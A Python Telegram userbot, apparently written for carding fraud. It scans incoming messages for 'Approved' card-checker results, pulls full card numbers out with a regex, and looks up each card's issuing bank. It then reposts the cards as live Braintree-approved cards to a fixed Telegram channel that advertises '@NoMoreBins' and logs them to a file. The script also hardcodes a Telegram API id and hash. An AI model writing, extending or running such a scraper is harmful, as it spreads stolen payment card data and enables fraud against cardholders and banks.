import pyrogram
import re
import asyncio
import aiohttp

app = pyrogram.Client(
    'TheFuckinMaster',
    api_id='25734672',
    api_hash='515e1d366bc8c0aa8cf7eb494e81d627'
)

apijonasxastro = 'https://binlist.io/lookup/{}'

def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    return matches

async def get_bin_info(mars):
    async with aiohttp.ClientSession() as session:
        async with session.get(apijonasxastro.format(mars)) as response:
            if response.status == 200:
                return await response.json()
            else:
                return None

async def approve(Client, message):
    try:
        if re.search(r'(Card|𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅|APPROVED||||||)', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            for card_info in filtered_card_info:
                mars = card_info[:6]
                bin_info = await get_bin_info(mars)
                if bin_info and bin_info.get('success', False):
                    data = bin_info
                    formatted_message = (

                        f"<b> 𝗡𝗠𝗕 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ </code>\n\n\n"
                        
                        f"<b>𝗖𝗮𝗿𝗱 ↬ </b><code>{card_info}</code>\n"
                        f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↬ Braintree Auth (200) </b>\n"
                        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↬ Approved</b>\n\n"
                        f"<b>𝗜𝗻𝗳𝗼 ↬ {data.get('scheme', '')} - {data.get('type', '')}</b>\n"
                        f"<b>𝗜𝘀𝘀𝘂𝗲𝗿 ↬ {data.get('bank', {}).get('name', '')}</b>\n"
                        f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↬ {data.get('country', {}).get('name', '')} {data.get('country', {}).get('emoji', '')}</b>\n\n"
                        f"<b>𝗝𝗼𝗶𝗻 𝗨𝘀 ↬ @NoMoreBins </b>\n"
                        
                    )

                    await asyncio.sleep(5)
                    await Client.send_message(chat_id=-1001644982624, text=formatted_message)

                    with open('reserved.txt', 'a', encoding='utf-8') as f:
                        f.write(card_info + '\n')
                else:
                    pass 
    except Exception as e:
        print(e)

@app.on_message()
async def astroboy(Client, message):
    if message.text:
        await asyncio.create_task(approve(Client, message))

app.run()
